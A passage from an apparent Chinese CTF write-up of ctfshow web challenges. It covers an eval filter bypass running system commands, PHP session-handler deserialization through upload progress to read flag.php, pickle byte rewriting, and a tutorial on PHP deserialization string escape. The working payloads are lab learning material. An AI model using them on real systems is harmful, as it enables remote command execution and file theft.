[{"content":"ctfshow-新手杯-web easy_eval 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); $code = $_POST[\u0026#39;code\u0026#39;]; if(isset($code)){ $code = str_replace(\u0026#34;?\u0026#34;,\u0026#34;\u0026#34;,$code); eval(\u0026#34;?\u0026gt;\u0026#34;.$code); } 题目分析 1 2 3 eval(\u0026#34;?\u0026gt;\u0026#34;.$code);将字符串$code的内容作为PHP代码进行解析和执行。 字符串\u0026#34;?\u0026gt;\u0026#34;表示PHP的结束标记，而$code是包含要执行的实际PHP代码的字符串。 ?\u0026gt;将eval函数进行闭合，eval函数失去了作用，需要自己加php标签，输入过滤了问号，用javascript的标签来代替。 payload 1 2 3 POST: code=\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; system(\u0026#34;ls /\u0026#34;); \u0026lt;/script\u0026gt; code=\u0026lt;script language=\u0026#34;php\u0026#34;\u0026gt; system(\u0026#34;tac /f1agaaa\u0026#34;); \u0026lt;/script\u0026gt; 剪刀石头布 打开环境之后的页面\n输入name以后进入的页面\n题目源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 \u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); if(isset($_POST[\u0026#39;source\u0026#39;])){ highlight_file(__FILE__); phpinfo(); die(); } error_reporting(0); include \u0026#34;flag.php\u0026#34;; class Game{ public $log,$name,$play; public function __construct($name){ $this-\u0026gt;name = $name; $this-\u0026gt;log = \u0026#39;/tmp/\u0026#39;.md5($name).\u0026#39;.log\u0026#39;; } public function play($user_input,$bot_input){ $output = array(\u0026#39;Rock\u0026#39;=\u0026gt;\u0026#39;\u0026amp;#9996;\u0026amp;#127995;\u0026#39;,\u0026#39;Paper\u0026#39;=\u0026gt;\u0026#39;\u0026amp;#9994;\u0026amp;#127995;\u0026#39;,\u0026#39;Scissors\u0026#39;=\u0026gt;\u0026#39;\u0026amp;#9995;\u0026amp;#127995;\u0026#39;); $this-\u0026gt;play = $user_input.$bot_input; if($this-\u0026gt;play == \u0026#34;RockRock\u0026#34; || $this-\u0026gt;play == \u0026#34;PaperPaper\u0026#34; || $this-\u0026gt;play == \u0026#34;ScissorsScissors\u0026#34;){ file_put_contents($this-\u0026gt;log,\u0026#34;\u0026lt;div\u0026gt;\u0026#34;.$output[$user_input].\u0026#39; VS \u0026#39;.$output[$bot_input].\u0026#34; Draw\u0026lt;/div\u0026gt;\\n\u0026#34;,FILE_APPEND); return \u0026#34;Draw\u0026#34;; } else if($this-\u0026gt;play == \u0026#34;RockPaper\u0026#34; || $this-\u0026gt;play == \u0026#34;PaperScissors\u0026#34; || $this-\u0026gt;play == \u0026#34;ScissorsRock\u0026#34;){ file_put_contents($this-\u0026gt;log,\u0026#34;\u0026lt;div\u0026gt;\u0026#34;.$output[$user_input].\u0026#39; VS \u0026#39;.$output[$bot_input].\u0026#34; You Lose\u0026lt;/div\u0026gt;\\n\u0026#34;,FILE_APPEND); return \u0026#34;You Lose\u0026#34;; } else if($this-\u0026gt;play == \u0026#34;RockScissors\u0026#34; || $this-\u0026gt;play == \u0026#34;PaperRock\u0026#34; || $this-\u0026gt;play == \u0026#34;ScissorsPaper\u0026#34;){ file_put_contents($this-\u0026gt;log,\u0026#34;\u0026lt;div\u0026gt;\u0026#34;.$output[$user_input].\u0026#39; VS \u0026#39;.$output[$bot_input].\u0026#34; You Win\u0026lt;/div\u0026gt;\\n\u0026#34;,FILE_APPEND); return \u0026#34;You Win\u0026#34;; } } public function __destruct(){ echo \u0026#34;\u0026lt;h5\u0026gt;Game History\u0026lt;/h5\u0026gt;\\n\u0026#34;; echo \u0026#34;\u0026lt;div class=\u0026#39;all_output\u0026#39;\u0026gt;\\n\u0026#34;; echo file_get_contents($this-\u0026gt;log); echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; } } ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;icon.png\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Rock Paper Scissors\u0026lt;/title\u0026gt; \u0026lt;!-- post \u0026#39;source\u0026#39; to view something --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;?php session_start(); if(isset($_POST[\u0026#39;name\u0026#39;])){ $_SESSION[\u0026#39;name\u0026#39;]=$_POST[\u0026#39;name\u0026#39;]; $_SESSION[\u0026#39;win\u0026#39;]=0; } if(!isset($_SESSION[\u0026#39;name\u0026#39;])){ ?\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h5\u0026gt;Input your name :\u0026lt;/h5\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;result\u0026#34; name=\u0026#34;name\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php exit(); } ?\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php echo \u0026#34;\u0026lt;h5\u0026gt;Welecome \u0026#34;.$_SESSION[\u0026#39;name\u0026#39;].\u0026#34;, now you win \u0026#34;.$_SESSION[\u0026#39;win\u0026#39;].\u0026#34; rounds.\u0026lt;/h5\u0026gt;\u0026#34;; $Game=new Game($_SESSION[\u0026#39;name\u0026#39;]); ?\u0026gt; \u0026lt;h5\u0026gt;Make your choice :\u0026lt;/h5\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; value=\u0026#34;Rock\u0026#34; name=\u0026#34;choice\u0026#34;\u0026gt;\u0026amp;#9996;\u0026amp;#127995;\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; value=\u0026#34;Paper\u0026#34; name=\u0026#34;choice\u0026#34;\u0026gt;\u0026amp;#9994;\u0026amp;#127995;\u0026lt;/button\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; value=\u0026#34;Scissors\u0026#34; name=\u0026#34;choice\u0026#34;\u0026gt;\u0026amp;#9995;\u0026amp;#127995;\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php $choices = array(\u0026#34;Rock\u0026#34;, \u0026#34;Paper\u0026#34;, \u0026#34;Scissors\u0026#34;); $rand_bot = array_rand($choices); $bot_input = $choices[$rand_bot]; if(isset($_POST[\u0026#34;choice\u0026#34;]) AND in_array($_POST[\u0026#34;choice\u0026#34;],$choices)){ $user_input = $_POST[\u0026#34;choice\u0026#34;]; $result=$Game-\u0026gt;play($user_input,$bot_input); if ($result==\u0026#34;You Win\u0026#34;){ $_SESSION[\u0026#39;win\u0026#39;]+=1; } else { $_SESSION[\u0026#39;win\u0026#39;]=0; } } else { ?\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;flag\u0026#34; value=\u0026#34;flag\u0026#34; name=\u0026#34;flag\u0026#34;\u0026gt;get flag\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;source\u0026#34; value=\u0026#34;source\u0026#34; name=\u0026#34;source\u0026#34;\u0026gt;show source\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if(isset($_POST[\u0026#34;flag\u0026#34;])){ if($_SESSION[\u0026#39;win\u0026#39;]\u0026lt;100){ echo \u0026#34;\u0026lt;div\u0026gt;You need to win 100 rounds in a row to get flag.\u0026lt;/div\u0026gt;\u0026#34;; } else { echo \u0026#34;Here is your flag:\u0026#34;.$flag; } } } ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 题目分析 hint：我为啥要ini_set来着 hint2：php.ini配置的稀烂\n1 ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); 根据这两个不同的php处理器，php_serialize和php，可以实现session反序列化的构造\n关键类以及类中的关键函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Game { public $log,$name,$play; public function __construct($name) { $this-\u0026gt;name = $name; $this-\u0026gt;log = \u0026#39;/tmp/\u0026#39;.md5($name).\u0026#39;.log\u0026#39;; } public function __destruct() { echo \u0026#34;\u0026lt;h5\u0026gt;Game History\u0026lt;/h5\u0026gt;\\n\u0026#34;; echo \u0026#34;\u0026lt;div class=\u0026#39;all_output\u0026#39;\u0026gt;\\n\u0026#34;; echo file_get_contents($this-\u0026gt;log); echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; } } 观察到__destruct()函数的echo file_get_contents($this-\u0026gt;log);，由源码中发现include \u0026ldquo;flag.php\u0026rdquo;;，可以将$log赋值为/var/www/html/flag.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;?php class Game { public $log; public function __construct() { $this-\u0026gt;log = \u0026#34;/var/www/html/flag.php\u0026#34;; } } $a = new Game(); echo serialize($a); ?\u0026gt; # 输出结果：O:4:\u0026#34;Game\u0026#34;:1:{s:3:\u0026#34;log\u0026#34;;s:22:\u0026#34;/var/www/html/flag.php\u0026#34;;} # 加一个|：|O:4:\u0026#34;Game\u0026#34;:1:{s:3:\u0026#34;log\u0026#34;;s:22:\u0026#34;/var/www/html/flag.php\u0026#34;;} 在php处理器php_serialize的处理下，存储该序列化字符串，|(管道符)只是一个普通字符，但是php处理器php的处理下，读取该序列化字符串， |(管道符)被作为分割键名和键值的分割线，所以|后面的内容会被反序列化。\n观察代码会发现源码是没有$_SESSION变量赋值但符合使用不同的引擎来处理session文件，所以使用php中的upload_process机制。\n知识点 file_get_contents() 函数 file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。\n什么是session？ session：会话控制。session对象存储特定用户会话所需的属性及配置信息。\n当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。\nsession工作流程 当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。\n当同一个用户再次访问这个网站时，会自动通过HTTP的请求头将Cookie中保存的Seesion ID再次携带，Session_start()函数不会再分配新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将之前为这个用户保存的会话信息读取出来。\nsession_start()作用 当会话自动开始或利用session_start()手动开始， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并填充到 $_SESSION 超级全局变量中。\n如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。\nphp.ini中关于session的相关配置 1 2 3 4 session.save_path=\u0026#34;\u0026#34; //设置session的存储路径 session.save_handler=\u0026#34;\u0026#34; //设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen //指定会话模块是否在请求开始时启动一个会话默认为0不启动 session.serialize_handler string //定义用来序列化/反序列化的处理器名字。默认使用php session机制对序列化的三种不同处理器 1 2 3 4 5 6 7 8 php_binary 存储方式：键名长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php 存储方式：键名+竖线+经过serialize()函数序列处理的值 php_serialize(php\u0026gt;5.5.4) 存储方式：经过serialize()函数序列化处理的值 实例\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php ini_set(\u0026#39;session.serialize_handler\u0026#39;, \u0026#39;php\u0026#39;); //ini_set(\u0026#34;session.serialize_handler\u0026#34;, \u0026#34;php_serialize\u0026#34;); //ini_set(\u0026#34;session.serialize_handler\u0026#34;, \u0026#34;php_binary\u0026#34;); session_start(); $_SESSION[\u0026#39;lemon\u0026#39;] = $_GET[\u0026#39;a\u0026#39;]; echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; var_dump($_SESSION); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; 1 2 3 php : lemon|s:3:\u0026#34;abc\u0026#34;; php_serialize : a:1:{s:5:\u0026#34;lemon\u0026#34;;s:3:\u0026#34;abc\u0026#34;;} php_binary : lemons:3:\u0026#34;abc\u0026#34;; session反序列化漏洞成因 不同的引擎对|（管道符）会有不同的处理，php_binary或者php_serialize都不会识别|，而且对输入的具体值不会当成一个由对象序列化的字符串来反序列化，而是直接把输入的字符串当成一个具体的值来反序列化。然而php会把|后的字符串当成一个由对象序列化的字符串来反序列化。\n为什么在解析session文件时，php直接对\u0026rsquo;|\u0026lsquo;后的值进行反序列化处理？\n当会话自动开始或者通过session_start()手动开始的时候，php内部会调用会话管理器的open和read回调函数。会话管理器可能是php默认的，也可能是扩展提供的（SQLite 或者 Memcached扩展），也可能是通过session_set_save_handler()设定的用户自定义会话管理器。通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），php会自动反序列化数据并填充$_SESSION超级全局变量。\nupload_process机制 没有$_SESSION变量赋值,怎么解决？\nphp存在一个upload_process机制，即自动在$_SESSION中创建一个键值对，值中刚好存在用户可控的部分。\n写入的方式主要是利用PHP中Session Upload Progress来进行设置，具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中。\n参考资料：session反序列化\npayload session文件上传脚本（这里我上传了一个空的text文件） 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://8975c3dd-0e68-4b58-a425-abdf4c9f5da4.challenge.ctf.show/\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;PHP_SESSION_UPLOAD_PROGRESS\u0026#34; value=\u0026#34;123\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 序列化字符串 1 |O:4:\u0026#34;Game\u0026#34;:1:{s:3:\u0026#34;log\u0026#34;;s:22:\u0026#34;/var/www/html/flag.php\u0026#34;;} filename改为单引号，直接将文件名内容改为序列化字符串。\nfilename仍然是双引号，将序列化字符串中的双引号进行转义。\nbaby_pickle 打开环境后的页面显示\n1 2 欢迎来到新手村new_rookie 只有成为大菜鸡才能得到flag 题目附件源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 # Author: # Achilles # Time: # 2022-9-20 # For: # ctfshow import base64 import pickle, pickletools import uuid from flask import Flask, request app = Flask(__name__) id = 0 flag = \u0026#34;ctfshow{\u0026#34; + str(uuid.uuid4()) + \u0026#34;}\u0026#34; class Rookie(): def __init__(self, name, id): self.name = name self.id = id @app.route(\u0026#34;/\u0026#34;) def agent_show(): global id id = id + 1 if request.args.get(\u0026#34;name\u0026#34;): name = request.args.get(\u0026#34;name\u0026#34;) else: name = \u0026#34;new_rookie\u0026#34; new_rookie = Rookie(name, id) try: file = open(str(name) + \u0026#34;_info\u0026#34;, \u0026#39;wb\u0026#39;) info = pickle.dumps(new_rookie, protocol=0) info = pickletools.optimize(info) file.write(info) file.close() except Exception as e: return \u0026#34;error\u0026#34; with open(str(name)+\u0026#34;_info\u0026#34;, \u0026#34;rb\u0026#34;) as file: user = pickle.load(file) message = \u0026#34;\u0026lt;h1\u0026gt;欢迎来到新手村\u0026#34; + user.name + \u0026#34;\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;\u0026#34; + \u0026#34;只有成为大菜鸡才能得到flag\u0026#34; + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34; return message @app.route(\u0026#34;/dacaiji\u0026#34;) def get_flag(): name = request.args.get(\u0026#34;name\u0026#34;) with open(str(name)+\u0026#34;_info\u0026#34;, \u0026#34;rb\u0026#34;) as f: user = pickle.load(f) if user.id != 0: message = \u0026#34;\u0026lt;h1\u0026gt;你不是大菜鸡\u0026lt;/h1\u0026gt;\u0026#34; return message else: message = \u0026#34;\u0026lt;h1\u0026gt;恭喜你成为大菜鸡\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;\u0026#34; + flag + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34; return message @app.route(\u0026#34;/change\u0026#34;) def change_name(): name = base64.b64decode(request.args.get(\u0026#34;name\u0026#34;)) newname = base64.b64decode(request.args.get(\u0026#34;newname\u0026#34;)) file = open(name.decode() + \u0026#34;_info\u0026#34;, \u0026#34;rb\u0026#34;) info = file.read() print(\u0026#34;old_info ====================\u0026#34;) print(info) print(\u0026#34;name ====================\u0026#34;) print(name) print(\u0026#34;newname ====================\u0026#34;) print(newname) info = info.replace(name, newname) print(info) file.close() with open(name.decode()+ \u0026#34;_info\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(info) return \u0026#34;success\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8888) 题目分析 1 2 3 4 5 6 7 # 关键代码： if user.id != 0: message = \u0026#34;\u0026lt;h1\u0026gt;你不是大菜鸡\u0026lt;/h1\u0026gt;\u0026#34; return message else: message = \u0026#34;\u0026lt;h1\u0026gt;恭喜你成为大菜鸡\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;\u0026#34; + flag + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34; return message 这里要想得到flag，需要成为大菜鸡，就是需要id=0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @app.route(\u0026#34;/change\u0026#34;) def change_name(): name = base64.b64decode(request.args.get(\u0026#34;name\u0026#34;)) newname = base64.b64decode(request.args.get(\u0026#34;newname\u0026#34;)) file = open(name.decode() + \u0026#34;_info\u0026#34;, \u0026#34;rb\u0026#34;) info = file.read() print(\u0026#34;old_info ====================\u0026#34;) print(info) print(\u0026#34;name ====================\u0026#34;) print(name) print(\u0026#34;newname ====================\u0026#34;) print(newname) info = info.replace(name, newname) print(info) file.close() with open(name.decode()+ \u0026#34;_info\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(info) return \u0026#34;success\u0026#34; 这段代码，我们name的值是可控的，可以先本地跑一下，看有没有什么发现。\n本地运行，并且/?name=123，发现生成了123_info文件，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 ccopy_reg _reconstructor (c__main__ Rookie c__builtin__ object NtR(dVname V123 sVid I2 sb. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 可以看到I2，应该是id=2， sb.可相当于结束序列化流程的一个标志。 这里联想到php反序列化字符逃逸。 sb.就类似于;}，name就是我们的可控变量。 我们的目标是id=0，这里需要被丢弃的为 sVid I2 sb. 那么name的值就该为 123 sVid I0 sb. 这样构造，相当于间接更改了id的值。那么直接在/change路由对name进行改值就可以啦。 官方wp也有一个思路\n1 2 3 4 5 6 7 8 9 观察id为0和1的序列化字节有什么不同 print(pickletools.optimize(pickle.dumps(Rookie(\u0026#34;aaa\u0026#34;,0),protocol=0))) print(pickletools.optimize(pickle.dumps(Rookie(\u0026#34;aaa\u0026#34;,1),protocol=0))) b\u0026#39;ccopy_reg\\n_reconstructor\\n(c__main__\\nRookie\\nc__builtin__\\nobject\\nNtR(dVname\\nVaaa\\nsVid\\nI0\\nsb.\u0026#39; b\u0026#39;ccopy_reg\\n_reconstructor\\n(c__main__\\nRookie\\nc__builtin__\\nobject\\nNtR(dVname\\nVaaa\\nsVid\\nI1\\nsb.\u0026#39; 从而可以想到利用php反序列化字符逃逸的做法。 知识点 php反序列化特点 php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并且是根据长度判断内容 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化 ，超出的部分并不会被反序列化成功，这说明反序列化的过程有一定识别范围，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。反序列化字符串都是以\u0026quot;;}结束，如果把\u0026quot;;}添入到需要反序列化的字符串中，就能让反序列化提前闭合结束，后面的内容就会丢弃。 长度不对应会报错。 PHP反序列化字符逃逸 漏洞成因：代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。\n漏洞条件：序列化后过滤再进行反序列化\n两种情况：过滤后字符变多、过滤后字符变少\n二者区别：\n字符串增加：构造的序列化语句和过滤的值在同一个变量 字符串减少：构造的序列化语句和过滤的值不在同个变量里 字符串增加：构造过滤的值的个数就是构造的序列化语句的字符串的字符个数 字符串减少：构造过滤的值的个数是下一个可控变量的字符串的字符个数\n字符串增加实例 目标：将isVIP变量的值修改为1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } $a = new user(\u0026#34;admin\u0026#34;,\u0026#34;123456\u0026#34;); $a_seri = serialize($a); echo $a_seri; ?\u0026gt; 1 2 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} 增加一个对admin字符进行替换的函数，将admin替换为hacker\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hacker\u0026#34;,$s); } $a = new user(\u0026#34;admin\u0026#34;,\u0026#34;123456\u0026#34;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;hacker\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} 1 2 3 O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;admin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} // 未过滤 O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;hacker\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} // 已过滤 已过滤字符串中的hacker与前面的字符长度不对应，此时，新建对象，则传入的admin就是可控变量 目标字串和现有字串比较\n1 2 3 4 \u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;}\t// 现有子串 \u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\t// 目标子串，长度为47 需要在admin这个可控变量的位置，注入目标子串。因为需要逃逸的目标字串长度为47，并且admin每次过滤后都会变成hacker，即每出现一次admin，就会多1个字符。因此需要在可控变量处重复47遍admin，并加上逃逸后的目标子串。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hacker\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#39;,\u0026#39;123456\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 3 4 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:282:\u0026#34;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} 一共是47个hacker，共282个字符，正好与前面282相对应，后面的注入子串也完成了逃逸。反序列化后，最后面的多余子串直接抛弃。 将序列化结果再反序列化之后，输出检查\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hacker\u0026#34;,$s); } $a = new user(\u0026#39;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:1;}\u0026#39;,\u0026#39;123456\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); $a_seri_filter_unseri = unserialize($a_seri_filter); var_dump($a_seri_filter_unseri); ?\u0026gt; 1 2 3 4 5 6 7 8 9 输出结果： object(user)#2 (3) { [\u0026#34;username\u0026#34;]=\u0026gt; string(282) \u0026#34;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\u0026#34; [\u0026#34;password\u0026#34;]=\u0026gt; string(6) \u0026#34;123456\u0026#34; [\u0026#34;isVIP\u0026#34;]=\u0026gt; int(1) } 字符串较少实例 目标：将isVIP变量的值修改为1\n增加对admin字符进行替换的函数，将admin替换为hack\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;?php class user { public $username; public $password; public $isVIP; public function __construct($u,$p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; $this-\u0026gt;isVIP = 0; } } function filter($s) { return str_replace(\u0026#34;admin\u0026#34;,\u0026#34;hack\u0026#34;,$s); } $a = new user(\u0026#39;admin\u0026#39;,\u0026#39;123456\u0026#39;); $a_seri = serialize($a); $a_seri_filter = filter($a_seri); echo $a_seri_filter; ?\u0026gt; 1 2 输出结果： O:4:\u0026#34;user\u0026#34;:3:{s:8:\u0026#34;username\u0026#34;;s:5:\u0026#34;hack\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;} 目标字串和现有字串比较\n1 2 3 4 5 \u0026#34;;s:8:\u0026#34;password\u0026#34;;s:6:\u0026#34;123456\u0026#34;;s:5:\u0026#34;isVIP\u0026#34;;i:0;}\t// 